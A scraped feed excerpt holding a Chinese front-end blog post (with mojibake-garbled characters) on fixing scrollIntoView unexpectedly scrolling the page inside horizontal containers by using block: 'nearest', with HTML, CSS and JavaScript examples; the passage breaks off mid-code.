<pre><code class="hljs"/></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ« scrollIntoView çš„â€œè¶Šçº§æ»šåŠ¨â€ï¼šä¸€è¡Œä»£ç è§£å†³æ¨ªå‘æ»šåŠ¨é—®é¢˜]]></title>    <link>https://juejin.cn/post/7592455394062254118</link>    <guid>https://juejin.cn/post/7592455394062254118</guid>    <pubDate>2026-01-07T12:52:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592455394062254118" data-draft-id="7592079304923414538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ« scrollIntoView çš„â€œè¶Šçº§æ»šåŠ¨â€ï¼šä¸€è¡Œä»£ç è§£å†³æ¨ªå‘æ»šåŠ¨é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-07T12:52:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="donecoding"/> <meta itemprop="url" content="https://juejin.cn/user/3192637500430093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ« scrollIntoView çš„â€œè¶Šçº§æ»šåŠ¨â€ï¼šä¸€è¡Œä»£ç è§£å†³æ¨ªå‘æ»šåŠ¨é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3192637500430093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    donecoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T12:52:03.000Z" title="Wed Jan 07 2026 12:52:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»Šå¤©åœ¨å¼€å‘ä¸­é‡åˆ°äº†ä¸€ä¸ªå…¸å‹çš„æ»šåŠ¨é—®é¢˜ï¼šåœ¨ä¸€ä¸ªæ¨ªå‘æ»šåŠ¨çš„å®¹å™¨ä¸­ï¼Œå½“å­å…ƒç´ è°ƒç”¨ <code>scrollIntoView()</code> æ–¹æ³•æ—¶ï¼Œæ„å¤–è§¦å‘äº†æ•´ä¸ªé¡µé¢çš„ <code>body</code> æ»šåŠ¨ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„å®¹å™¨å†…éƒ¨æ»šåŠ¨ã€‚</p>
<p>ç»è¿‡è°ƒè¯•ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªç®€å•å´é²œä¸ºäººçŸ¥çš„è§£å†³æ–¹æ¡ˆï¼Œä»Šå¤©åˆ†äº«ç»™å¤§å®¶ã€‚</p>
<h2 data-id="heading-1">é—®é¢˜é‡ç°</h2>
<h3 data-id="heading-2">åœºæ™¯æè¿°</h3>
<p>æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¨ªå‘æ»šåŠ¨çš„äº§å“åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-scroll-container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-list"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-item"</span>&gt;</span>äº§å“1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-item"</span>&gt;</span>äº§å“2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"product-item"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"target-product"</span>&gt;</span>ç›®æ ‡äº§å“<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æ›´å¤šäº§å“é¡¹ --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>å¯¹åº”çš„ CSSï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.product-scroll-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">overflow-x</span>: auto;
  <span class="hljs-attribute">overflow-y</span>: hidden;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#e0e0e0</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-selector-class">.product-list</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">width</span>: max-content;
}

<span class="hljs-selector-class">.product-item</span> {
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">160px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#f5f5f5</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<h3 data-id="heading-3">é—®é¢˜ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœŸæœ›ï¼šåœ¨å®¹å™¨å†…æ¨ªå‘æ»šåŠ¨åˆ°ç›®æ ‡äº§å“</span>
<span class="hljs-comment">// å®é™…ï¼šæ•´ä¸ªé¡µé¢å‘ç”Ÿæ»šåŠ¨</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'target-product'</span>).<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>
});
</code></pre>
<h2 data-id="heading-4">é—®é¢˜åˆ†æ</h2>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆä¼šè§¦å‘ body æ»šåŠ¨ï¼Ÿ</h3>
<ol>
<li>
<p><strong>é»˜è®¤å‚æ•°é™·é˜±</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é»˜è®¤è¡Œä¸ºç­‰ä»·äº</span>
element.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">block</span>: <span class="hljs-string">'start'</span>,    <span class="hljs-comment">// é»˜è®¤å€¼</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>  <span class="hljs-comment">// é»˜è®¤å€¼</span>
});
</code></pre>
</li>
<li>
<p><strong>æµè§ˆå™¨æ»šåŠ¨é€»è¾‘</strong>ï¼š</p>
<ul>
<li>å½“ <code>block: 'start'</code> æ—¶ï¼Œæµè§ˆå™¨ä¼šå°è¯•è®©å…ƒç´ çš„<strong>é¡¶éƒ¨</strong>å¯¹é½æ»šåŠ¨å®¹å™¨çš„é¡¶éƒ¨</li>
<li>å¦‚æœå®¹å™¨é«˜åº¦ä¸è¶³æˆ–å…ƒç´ ä½ç½®ç‰¹æ®Šï¼Œæµè§ˆå™¨å¯èƒ½ä¼šé€‰æ‹©æ›´å¤–å±‚çš„æ»šåŠ¨å®¹å™¨</li>
<li>æœ€ç»ˆå¯èƒ½è§¦å‘ <code>body</code> æˆ– <code>html</code> å…ƒç´ çš„æ»šåŠ¨</li>
</ul>
</li>
<li>
<p><strong>å®¹å™¨é«˜åº¦å½±å“</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®¹å™¨é«˜åº¦ï¼š200px</span>
<span class="hljs-comment">// å…ƒç´ é«˜åº¦ï¼š160px + padding</span>
<span class="hljs-comment">// å½“å°è¯• 'start' å¯¹é½æ—¶ï¼Œå¯èƒ½éœ€è¦é¢å¤–çš„å‚ç›´è°ƒæ•´</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-6">è§£å†³æ–¹æ¡ˆï¼šç¥å¥‡çš„ <code>block: 'nearest'</code></h2>
<h3 data-id="heading-7">ä¸€è¡Œä»£ç è§£å†³é—®é¢˜</h3>
<pre><code class="hljs language-javascript" lang="javascript">targetElement.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
  <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,     <span class="hljs-comment">// å…³é”®å˜åŒ–ï¼</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>      <span class="hljs-comment">// æ°´å¹³æ–¹å‘å±…ä¸­</span>
});
</code></pre>
<h3 data-id="heading-8">ä¸ºä»€ä¹ˆ <code>nearest</code> èƒ½è§£å†³é—®é¢˜ï¼Ÿ</h3>
<p><code>block: 'nearest'</code> çš„è¡Œä¸ºé€»è¾‘ï¼š</p>
<ol>
<li><strong>æ™ºèƒ½åˆ¤æ–­</strong>ï¼šæ£€æŸ¥å…ƒç´ ç›¸å¯¹äºè§†å£çš„ä½ç½®</li>
<li><strong>æœ€å°æ»šåŠ¨</strong>ï¼šé€‰æ‹©éœ€è¦æ»šåŠ¨æœ€å°‘çš„å¯¹é½æ–¹å¼</li>
<li><strong>é¿å…å†²çª</strong>ï¼šå¦‚æœå…ƒç´ å·²ç»åœ¨å‚ç›´æ–¹å‘ä¸Šå¯è§ï¼Œå°±ä¸æ»šåŠ¨</li>
</ol>
<p>å¯¹äºæ¨ªå‘æ»šåŠ¨å®¹å™¨ï¼š</p>
<ul>
<li>å‚ç›´æ–¹å‘ï¼šä¿æŒç°çŠ¶ï¼ˆä¸è§¦å‘ä¸å¿…è¦çš„æ»šåŠ¨ï¼‰</li>
<li>æ°´å¹³æ–¹å‘ï¼šæŒ‰æŒ‡å®šæ–¹å¼å¯¹é½ï¼ˆå¦‚ <code>center</code>ï¼‰</li>
</ul>
<h3 data-id="heading-9">å„ç§å¯¹é½æ–¹å¼å¯¹æ¯”</h3>



































<table><thead><tr><th>å‚æ•°</th><th>è¡Œä¸º</th><th>æ¨ªå‘æ»šåŠ¨åœºæ™¯</th><th>æ˜¯å¦æ¨è</th></tr></thead><tbody><tr><td><code>block: 'start'</code></td><td>é¡¶éƒ¨å¯¹é½</td><td>âŒ å¯èƒ½è§¦å‘bodyæ»šåŠ¨</td><td>ä¸æ¨è</td></tr><tr><td><code>block: 'center'</code></td><td>å‚ç›´å±…ä¸­</td><td>âŒ å¯èƒ½è§¦å‘bodyæ»šåŠ¨</td><td>ä¸æ¨è</td></tr><tr><td><code>block: 'end'</code></td><td>åº•éƒ¨å¯¹é½</td><td>âŒ å¯èƒ½è§¦å‘bodyæ»šåŠ¨</td><td>ä¸æ¨è</td></tr><tr><td><code>block: 'nearest'</code></td><td>æœ€è¿‘å¯¹é½</td><td>âœ… åªæ»šåŠ¨å¿…è¦æ–¹å‘</td><td><strong>æ¨è</strong></td></tr></tbody></table>
<h2 data-id="heading-10">å®é™…åº”ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-11">åœºæ™¯ä¸€ï¼šTab åˆ‡æ¢ç»„ä»¶</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TabComponent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">container</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span> = container;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tabs</span> = container.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.tab-item'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }
  
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">tab</span> =&gt;</span> {
      tab.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scrollToTab</span>(tab));
    });
  }
  
  <span class="hljs-title function_">scrollToTab</span>(<span class="hljs-params">tab</span>) {
    <span class="hljs-comment">// æ—§æ–¹å¼ï¼šå¯èƒ½å¯¼è‡´é¡µé¢è·³åŠ¨</span>
    <span class="hljs-comment">// tab.scrollIntoView({ behavior: 'smooth', inline: 'center' });</span>
    
    <span class="hljs-comment">// æ–°æ–¹å¼ï¼šå¹³ç¨³æ»šåŠ¨</span>
    tab.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,    <span class="hljs-comment">// é¿å…å‚ç›´è·³åŠ¨</span>
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>     <span class="hljs-comment">// æ°´å¹³å±…ä¸­</span>
    });
  }
}
</code></pre>
<h3 data-id="heading-12">åœºæ™¯äºŒï¼šå›¾ç‰‡è½®æ’­æŒ‡ç¤ºå™¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Carousel</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">slides</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.slide'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dots</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.dot'</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = <span class="hljs-number">0</span>;
  }
  
  <span class="hljs-title function_">goToSlide</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span> = index;
    <span class="hljs-keyword">const</span> slide = <span class="hljs-variable language_">this</span>.<span class="hljs-property">slides</span>[index];
    
    <span class="hljs-comment">// å¹³æ»‘æ»šåŠ¨åˆ°æŒ‡å®šå¹»ç¯ç‰‡</span>
    slide.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,      <span class="hljs-comment">// é‡è¦ï¼šä¿æŒå‚ç›´ä½ç½®</span>
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>       <span class="hljs-comment">// æ°´å¹³å±…ä¸­æ˜¾ç¤º</span>
    });
    
    <span class="hljs-comment">// æ›´æ–°æŒ‡ç¤ºå™¨çŠ¶æ€</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">updateDots</span>();
  }
  
  <span class="hljs-title function_">updateDots</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dots</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">dot, i</span>) =&gt;</span> {
      dot.<span class="hljs-property">classList</span>.<span class="hljs-title function_">toggle</span>(<span class="hljs-string">'active'</span>, i === <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentIndex</span>);
    });
  }
}
</code></pre>
<h3 data-id="heading-13">åœºæ™¯ä¸‰ï¼šèŠå¤©æ¶ˆæ¯æ»šåŠ¨</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatUI</span> {
  <span class="hljs-title function_">scrollToLatestMessage</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> messages = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.message'</span>);
    <span class="hljs-keyword">const</span> lastMessage = messages[messages.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
    
    <span class="hljs-keyword">if</span> (lastMessage) {
      lastMessage.<span class="hljs-title function_">scrollIntoView</span>({
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
        <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,    <span class="hljs-comment">// é¿å…é¡µé¢æ•´ä½“æ»šåŠ¨</span>
        <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>
      });
    }
  }
  
  <span class="hljs-title function_">scrollToMessage</span>(<span class="hljs-params">messageId</span>) {
    <span class="hljs-keyword">const</span> message = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(messageId);
    <span class="hljs-keyword">if</span> (message) {
      <span class="hljs-comment">// å…ˆç¡®ä¿æ¶ˆæ¯å¯è§</span>
      message.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'1'</span>;
      
      message.<span class="hljs-title function_">scrollIntoView</span>({
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
        <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
        <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>
      });
      
      <span class="hljs-comment">// é«˜äº®æ•ˆæœ</span>
      message.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">'#fff9c4'</span>;
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        message.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">''</span>;
      }, <span class="hljs-number">2000</span>);
    }
  }
}
</code></pre>
<h2 data-id="heading-14">å…¼å®¹æ€§å¤„ç†</h2>
<h3 data-id="heading-15">æµè§ˆå™¨å…¼å®¹æ€§ç°çŠ¶</h3>
<p>å¥½æ¶ˆæ¯æ˜¯ï¼Œ<code>scrollIntoView</code> çš„åŸºæœ¬åŠŸèƒ½åœ¨å„ä¸ªç°ä»£æµè§ˆå™¨ä¸­éƒ½æœ‰å¾ˆå¥½çš„æ”¯æŒï¼š</p>
<ul>
<li>âœ… Chrome 1+</li>
<li>âœ… Firefox 1+</li>
<li>âœ… Safari 1+</li>
<li>âœ… Edge 12+</li>
<li>âœ… Opera 12.1+</li>
</ul>
<p>ä½†æ˜¯ï¼Œå‚æ•°å¯¹è±¡çš„æ”¯æŒæƒ…å†µæœ‰æ‰€ä¸åŒï¼š</p>

































<table><thead><tr><th>ç‰¹æ€§</th><th>Chrome</th><th>Firefox</th><th>Safari</th><th>Edge</th></tr></thead><tbody><tr><td><code>behavior: 'smooth'</code></td><td>61+</td><td>36+</td><td>ä¸æ”¯æŒ</td><td>79+</td></tr><tr><td><code>block</code> å‚æ•°</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td></tr><tr><td><code>inline</code> å‚æ•°</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td><td>å…¨éƒ¨æ”¯æŒ</td></tr></tbody></table>
<h3 data-id="heading-16">å¹³æ»‘æ»šåŠ¨çš„ polyfill</h3>
<p>å¯¹äºä¸æ”¯æŒ <code>behavior: 'smooth'</code> çš„æµè§ˆå™¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">smoothScrollIntoView</span>(<span class="hljs-params">element, options = {}</span>) {
  <span class="hljs-keyword">const</span> defaultOptions = {
    <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
    <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>,
    ...options
  };
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒå¹³æ»‘æ»šåŠ¨</span>
  <span class="hljs-keyword">const</span> supportsSmooth = <span class="hljs-string">'scrollBehavior'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>;
  
  <span class="hljs-keyword">if</span> (supportsSmooth &amp;&amp; <span class="hljs-keyword">typeof</span> element.<span class="hljs-property">scrollIntoView</span> === <span class="hljs-string">'function'</span>) {
    <span class="hljs-comment">// ä½¿ç”¨åŸç”Ÿå¹³æ»‘æ»šåŠ¨</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: defaultOptions.<span class="hljs-property">block</span>,
      <span class="hljs-attr">inline</span>: defaultOptions.<span class="hljs-property">inline</span>
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// é™çº§æ–¹æ¡ˆï¼šä½¿ç”¨ CSS æˆ– JS åŠ¨ç”»</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">block</span>: defaultOptions.<span class="hljs-property">block</span>,
      <span class="hljs-attr">inline</span>: defaultOptions.<span class="hljs-property">inline</span>
    });
  }
}

<span class="hljs-comment">// ä½¿ç”¨ CSS å¹³æ»‘æ»šåŠ¨çš„é™çº§æ–¹æ¡ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addSmoothScrollPolyfill</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!(<span class="hljs-string">'scrollBehavior'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>)) {
    <span class="hljs-keyword">const</span> style = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'style'</span>);
    style.<span class="hljs-property">textContent</span> = <span class="hljs-string">`
      html {
        scroll-behavior: smooth;
      }
    `</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(style);
  }
}
</code></pre>
<h2 data-id="heading-17">é«˜çº§æŠ€å·§å’Œæœ€ä½³å®è·µ</h2>
<h3 data-id="heading-18">1. <strong>ç»“åˆ Intersection Observer</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartScroller</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">onIntersection</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
      { <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.5</span> }
    );
  }
  
  <span class="hljs-title function_">scrollToElement</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-comment">// å…ˆè§‚å¯Ÿå…ƒç´ æ˜¯å¦åœ¨è§†å£ä¸­</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>(element);
    
    <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
